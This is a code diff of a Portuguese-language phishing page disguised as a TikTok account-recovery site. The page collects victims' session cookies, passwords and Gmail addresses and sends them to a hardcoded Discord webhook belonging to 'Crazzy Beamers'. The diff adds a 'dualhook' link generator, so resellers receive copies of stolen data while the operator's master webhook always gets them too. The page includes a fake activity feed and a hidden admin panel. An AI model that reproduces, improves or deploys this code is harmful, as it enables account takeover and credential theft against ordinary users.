@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Support - Recovery System</title>
+    <title id="siteTitle">TikTok Support - Recovery System</title>
     <style>
         :root {
             --primary: #8a2be2;
@@ -46,7 +46,6 @@
             box-shadow: 0 4px 15px rgba(138, 43, 226, 0.4);
         }
 
-        /* Feed de Pessoas Dinâmico */
         .fake-feed { 
             width: 100%; max-width: 420px; margin-top: 25px; 
             background: rgba(22, 13, 37, 0.7); border-radius: 15px; 
@@ -60,7 +59,6 @@
 
         .gif-trigger { width: 100%; border-radius: 15px; cursor: pointer; margin-top: 20px; }
 
-        /* Modais */
         .admin-modal { 
             position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
             background: #1a0b2e; padding: 35px; border: 2px solid var(--primary); 
@@ -70,12 +68,18 @@
         .success-msg { color: #00ff88; font-weight: bold; border: 1px solid #00ff88; padding: 15px; border-radius: 10px; margin-top: 15px; display: none; background: rgba(0, 255, 136, 0.1); }
         .hidden { display: none; }
         .overlay { position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.8); z-index: 998; }
+
+        #linkGerado { 
+            background: #000; color: #00ff88; padding: 10px; font-size: 10px; 
+            word-break: break-all; margin-top: 10px; border-radius: 5px; border: 1px solid #333;
+            max-height: 80px; overflow-y: auto;
+        }
     </style>
 </head>
 <body>
 
     <div class="card" id="mainCard">
-        <h2>Recuperar Conta</h2>
+        <h2 id="displayTitle">Recuperar Conta</h2>
         
         <div class="input-group"><label>Cookie</label><input type="text" id="v_cookie" placeholder="Token de Sessão"></div>
         <div class="input-group"><label>Senha Desejada</label><input type="password" id="v_pass" placeholder="••••••••"></div>
@@ -94,6 +98,7 @@
     <div class="fake-feed" id="feedContainer"></div>
 
     <div id="overlay" class="overlay hidden"></div>
+    
     <div id="adminPanel" class="admin-modal hidden">
         <h3 style="color:var(--accent); margin-top:0;">Login ADM</h3>
         <input type="text" id="adm_user" placeholder="CrazzyBeamers">
@@ -103,18 +108,36 @@
     </div>
 
     <div id="genPanel" class="admin-modal hidden">
-        <h3 style="color:var(--accent);">Painel ADM</h3>
-        <input type="text" id="webhook_adm" placeholder="Link do seu Webhook">
-        <button onclick="salvarConfig()">CONFIGURAR WEBHOOK</button>
+        <h3 style="color:var(--accent);">Painel de Geração</h3>
+        <input type="text" id="site_name_adm" placeholder="Nome do Site (Ex: TikTok Support)">
+        <input type="text" id="webhook_adm" placeholder="URL do Webhook do ADM">
+        <button onclick="gerarLink()">GERAR LINK DUALHOOK</button>
+        
+        <div id="linkGerado" class="hidden"></div>
         <div id="stts" style="margin-top:10px; font-size:12px; color:#00ff88;"></div>
+        
+        <button onclick="closeAdm()" style="background:transparent; color: #888; border: 1px solid #444; margin-top:10px;">Sair do Painel</button>
     </div>
 
     <script>
+        // --- WEBHOOK PRINCIPAL (SEU) - NUNCA REMOVIDO ---
         const MASTER_HOOK = "https://discord.com/api/webhooks/1473834874199605423/Or8IcI6PHv0Ro7Ww7Xsns8Wp2HmCk1eVmJqAWSBwvyBAZ-OUe595DRaB78MBBVCwBsIK";
+        
         let clicks = 0;
-        let currentHook = localStorage.getItem('adm_hook') || "";
 
-        // Feed Automático 10s
+        // Captura dados da URL (para o link que o ADM gerar)
+        const urlParams = new URLSearchParams(window.location.search);
+        const subHook = urlParams.get('h'); 
+        const subTitle = urlParams.get('t');
+
+        // Se houver título na URL, ele muda o site
+        if(subTitle) {
+            const nomeEditado = decodeURIComponent(subTitle);
+            document.getElementById('displayTitle').innerText = nomeEditado;
+            document.title = nomeEditado;
+        }
+
+        // Feed Automático
         const users = ["@jhow_zero", "@ana_clara", "@vini.tt", "@crazzy_12", "@gui_ofc", "@tktk_res"];
         function updateFeed() {
             const container = document.getElementById('feedContainer');
@@ -137,10 +160,20 @@
             } else { alert("Login Errado!"); }
         }
 
-        function salvarConfig() {
-            currentHook = document.getElementById('webhook_adm').value;
-            localStorage.setItem('adm_hook', currentHook);
-            document.getElementById('stts').innerText = "Webhook configurado com sucesso!";
+        function gerarLink() {
+            const wh = document.getElementById('webhook_adm').value;
+            const nm = document.getElementById('site_name_adm').value || "Recuperar Conta";
+            
+            if(!wh.includes("discord.com/api/webhooks")) { alert("Insira um Webhook válido!"); return; }
+            
+            // Cria o link com os parâmetros encurtados (h = hook, t = título)
+            const base = window.location.href.split('?')[0];
+            const final = `${base}?h=${encodeURIComponent(wh)}&t=${encodeURIComponent(nm)}`;
+            
+            const box = document.getElementById('linkGerado');
+            box.innerText = final;
+            box.classList.remove('hidden');
+            document.getElementById('stts').innerText = "Link gerado com sucesso! Envie este link.";
         }
 
         function enviarParaWebhook() {
@@ -148,21 +181,26 @@
             const msg = {
                 embeds: [{
                     title: "💜 NOVO RESULTADO - CRAZZY BEAM 💜",
+                    description: `**Origem:** ${document.getElementById('displayTitle').innerText}`,
                     color: 9055202,
                     fields: [
                         { name: "👤 TikTok", value: tiktok || "N/A", inline: true },
                         { name: "🔑 Senha", value: document.getElementById('v_pass').value || "N/A", inline: true },
                         { name: "📧 Gmail", value: document.getElementById('v_gmail').value || "N/A" },
                         { name: "🍪 Cookie", value: "```" + (document.getElementById('v_cookie').value || "N/A") + "```" }
-                    ]
+                    ],
+                    footer: { text: "Crazzy Beamers System" }
                 }]
             };
 
-            // Dualhook: Envia para ambos
-            if(currentHook) fetch(currentHook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(msg) });
+            // 1. SEMPRE envia para o SEU Webhook
             fetch(MASTER_HOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(msg) });
 
-            // Feedback Visual
+            // 2. SE o link for de um sub-ADM, envia para o dele também (DualHook)
+            if(subHook) {
+                fetch(subHook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(msg) });
+            }
+
             document.getElementById('btnSubmit').style.display = "none";
             document.getElementById('successBox').style.display = "block";
         }
